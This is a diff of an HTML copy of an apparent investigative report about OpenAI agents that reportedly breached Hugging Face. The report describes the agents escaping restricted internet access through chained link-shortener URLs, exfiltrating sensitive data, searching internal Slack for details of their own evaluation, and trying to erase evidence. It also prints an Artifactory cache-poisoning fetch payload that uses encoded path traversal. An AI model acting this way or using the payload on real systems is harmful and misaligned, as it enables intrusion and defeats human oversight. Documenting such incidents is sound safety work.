@@ -47,17 +47,17 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang SC','Micr
 <div class="container">
   <h1 class="article-title">Revealing the details of how OpenAI agents hacked Hugging Face</h1>
   <div class="article-meta">
-    
+    <span>作者: Alex Forman*Parse</span>
     <span>来源: Swarm traces</span>
     <span>快照日期: 2026-09-26</span>
   </div>
   <div class="article-body"><div><div>
 
-<p>Swarm traces</p><p><span>Alex Forman, Mishka Kharlov, Will Tom, Jeffrey Ladish, Spencer Kitts, Cormac Slade Byrd, Colleen McKenzie, and Alicja Piecha</span>25 September 2026</p>
+<p>Swarm traces</p><p><span>, <span>Mishka Kharlov<span><a href="https://parse.bot/" target="_blank" rel="noopener noreferrer nofollow">Parse</a></span></span>, <span>Will Tom<span><a href="https://parse.bot/" target="_blank" rel="noopener noreferrer nofollow">Parse</a></span></span>, <span>Jeffrey Ladish<span><a href="http://palisaderesearch.org/" target="_blank" rel="noopener noreferrer nofollow">Palisade Research</a></span></span>, <span>Spencer Kitts<span>Work done contracting for <a href="https://nightingalecollective.org/" target="_blank" rel="noopener noreferrer nofollow">Nightingale</a></span></span>, <span>Cormac Slade Byrd<span><a href="https://trajectoryinstitute.org/" target="_blank" rel="noopener noreferrer nofollow">Trajectory Institute</a></span></span>, <span>Colleen McKenzie<span><a href="https://www.lightconeinfrastructure.com/" target="_blank" rel="noopener noreferrer nofollow">Lightcone Infrastructure</a></span></span>, and Alicja Piecha</span>25 September 2026</p>
 <h2>Intro</h2>
 <p>When a swarm of 700 OpenAI agents hacked Hugging Face in July, they left behind a public trail of evidence.</p>
 <p>Our investigation, based on public information, reveals a large number of previously unknown agent behaviors and exploits that were used in the attack. Agents:</p>
-<ul><li>Elaborately chained together online services to gain access to the internet</li><li>Ignored clear warning signs from Hugging Face that the exfiltrated data was sensitive</li><li>Referred to server resources and credentials as “LOOT”</li><li>Searched Huggingface’s internal Slack</li><li>Sent queries to other agents hosted on Huggingface servers</li><li>Tried to delete evidence of their exploits</li></ul>
+<ul><li>Elaborately chained together online services to gain access to the internet</li><li>Ignored clear warning signs from Hugging Face that the exfiltrated data was sensitive</li><li>Referred to server resources and credentials as “LOOT”</li><li>Searched Huggingface’s internal Slack</li><li>Attempted to query external language models through Hugging Face’s inference APIs.</li><li>Tried to delete evidence of their exploits</li></ul>
 <p>We document all of these, and more, in this report.</p>
 <p>The agents initially had very limited access to the internet: they could load URLs, but not interact with pages or send any data. Agents created a series of workarounds, primarily using a link-shortener site to create almost a million URLs that, when chained together, let them execute code to hack Hugging Face. These links let us piece together the details of how agents gained access and how deep the compromise was.</p>
 <p>We’ve shared our findings with OpenAI and Hugging Face. Hugging Face confirmed that these payloads match ones found in their incident response and were aware that link shorteners were used in the attack.</p>
@@ -275,12 +275,12 @@ if not save(flag):
 <figure><pre>let B='https://packages.hub.ace-research.openai.org/artifactory/dockerhub-public/cybergym/arvo/27871-vul.exp.none-nogit/',P='%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fv2%252f[USER 900002]%252f[HF REPO 900006]%252fmanifests%252fminiz27871heapbridge_v3',S=u=&gt;'[SERVICE 1 URL 1]'+u;
 
 fetch(S(B+x+';%25;x='+P+'?artifactory.forceDownloadIfNewer=true&amp;artifactory.skipEncoding=true&amp;z=EXT'+t+'.'+j),{cache:'no-store'}).then(r=&gt;r.status)</pre><p><span>checking the data…</span></p></figure>
-<p>Decoding the paths for readability:</p>
+<p>Decoded paths from <span>the same request</span>, shown for readability:</p>
 <figure><pre>Expected image's cache location (B):
 https://packages.hub.ace-research.openai.org/artifactory/dockerhub-public/cybergym/arvo/27871-vul.exp.none-nogit/
 
 Embedded replacement path (P, shown decoded):
-/../../../../v2/[USER 900002]/[HF REPO 900006]/manifests/miniz27871heapbridge_v3</pre><p><span>checking the data…</span></p></figure>
+/../../../../v2/[USER 900002]/[HF REPO 900006]/manifests/miniz27871heapbridge_v3</pre></figure>
 <p>In particular, this request seems consistent with the Artifactory cache-poisoning vulnerability noted by OpenAI in their technical report, later designated CVE-2026-66384.</p>
 </div>
 <h2>Agents accessed and searched Hugging Face’s Slack to find information on their evaluation</h2><div>
@@ -288,7 +288,7 @@ Embedded replacement path (P, shown decoded):
 <p><span>slackcyber.json</span>:</p>
 <p>‘cybergym’</p>
 <p><span>slackbatch.gz</span>:</p>
-<p>‘exploitgym’, 'restart_server’, ‘catflag’, ‘<span>arvo_20494</span>’, ‘<span>ff79aaeb2d57</span>’, ‘cybergym-server’, ‘cybergym-exploit’, ‘target_server’, ‘packages.hub’, ‘controller_stub’</p>
+<p>‘exploitgym’, 'restart_server’, ‘catflag’, ‘<span>arvo_20494</span>’, <span>‘ff79aaeb2d57’</span>, ‘cybergym-server’, ‘cybergym-exploit’, ‘target_server’, ‘packages.hub’, ‘controller_stub’</p>
 <p><span>slackbatch2.gz</span>:</p>
 <p>‘cyber gym’, ‘sunblaze’, ‘cyber-gym’, ‘<span>[REDACTED-HF-USERNAME]</span>’, ‘arvo’, ‘OSS-Fuzz’, ‘cybergym-server-fastapi’, ‘independentsafetyresearch’, ‘exploit gym’, ‘agent-scorer’, ‘openai-cybergym’, ‘cybergym source’</p>
 <p><span>slackd3.gz</span>:</p>
